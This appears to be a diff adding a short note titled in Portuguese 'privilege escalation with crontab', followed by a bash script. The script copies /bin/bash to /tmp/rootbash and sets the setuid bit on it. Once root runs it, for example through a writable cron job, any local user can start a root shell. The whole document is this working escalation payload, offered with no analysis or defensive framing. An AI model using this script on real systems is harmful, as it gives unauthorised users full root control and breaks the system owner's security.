@@ -1,0 +1,7 @@
+Escalação de privilegios com crontab
+
+#!/bin/bash
+rm /tmp/rootbash
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+
